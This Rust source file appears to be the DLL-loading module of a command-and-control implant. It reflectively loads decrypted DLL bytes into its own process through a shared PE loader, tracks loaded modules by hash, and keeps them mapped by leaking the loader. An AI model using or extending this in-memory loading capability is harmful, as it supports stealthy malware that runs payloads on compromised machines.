//! DLL Loading module
//!
//! Uses c2_common's PE loader to load DLLs into memory (self-injection).

use std::collections::HashMap;
use std::sync::Mutex;

/// Global registry of loaded DLLs (hash -> base_address)
/// Used to prevent loading the same DLL twice
static LOADED_DLLS: Mutex<Option<HashMap<u32, usize>>> = Mutex::new(None);

/// Compute DJB2 hash of DLL bytes for deduplication
fn compute_dll_hash(dll_bytes: &[u8]) -> u32 {
    c2_common::djb2_hash(dll_bytes)
}

/// Check if a DLL with this hash is already loaded
/// Returns Some(base_address) if already loaded, None otherwise
fn get_loaded_dll(hash: u32) -> Option<usize> {
    let guard = LOADED_DLLS.lock().ok()?;
    guard.as_ref()?.get(&hash).copied()
}

/// Register a newly loaded DLL
fn register_loaded_dll(hash: u32, base_address: usize) {
    if let Ok(mut guard) = LOADED_DLLS.lock() {
        let map = guard.get_or_insert_with(HashMap::new);
        map.insert(hash, base_address);
    }
}

/// Load a DLL from raw bytes into the current process
///
/// Uses the PE loader from c2_common to:
/// 1. Parse the PE
/// 2. Allocate memory
/// 3. Map sections
/// 4. Apply relocations
/// 5. Resolve imports
/// 6. Call DllMain
///
/// # Arguments
/// * `dll_bytes` - The raw (decrypted) DLL bytes
///
/// # Returns
/// * `Ok(base_address)` - The base address where the DLL was loaded
/// * `Err(error_message)` - Error description if loading failed
#[cfg(windows)]
pub fn load_dll_from_bytes(dll_bytes: &[u8]) -> Result<usize, String> {
    use c2_common::pe::loader::PeLoader;

    // Basic validation
    if dll_bytes.len() < 64 {
        return Err("DLL too small".to_string());
    }

    // Check DOS header magic
    if dll_bytes[0] != 0x4D || dll_bytes[1] != 0x5A {
        return Err("Invalid DOS header (not MZ)".to_string());
    }

    // Compute hash to check for duplicates
    let dll_hash = compute_dll_hash(dll_bytes);

    // Check if already loaded
    if let Some(existing_addr) = get_loaded_dll(dll_hash) {
        return Err(format!(
            "DLL already loaded at 0x{:X} (hash: 0x{:08X})",
            existing_addr, dll_hash
        ));
    }

    // Load the DLL using PE loader
    let loader = unsafe { PeLoader::load(dll_bytes).map_err(|e| e.to_string())? };

    let base_addr = loader.base_address() as usize;

    // Register this DLL as loaded
    register_loaded_dll(dll_hash, base_addr);

    // Important: We need to keep the DLL loaded, so we forget the loader
    // to prevent its Drop from unloading the DLL
    std::mem::forget(loader);

    Ok(base_addr)
}

/// Stub for non-Windows platforms
#[cfg(not(windows))]
pub fn load_dll_from_bytes(_dll_bytes: &[u8]) -> Result<usize, String> {
    Err("DLL loading is only supported on Windows".to_string())
}
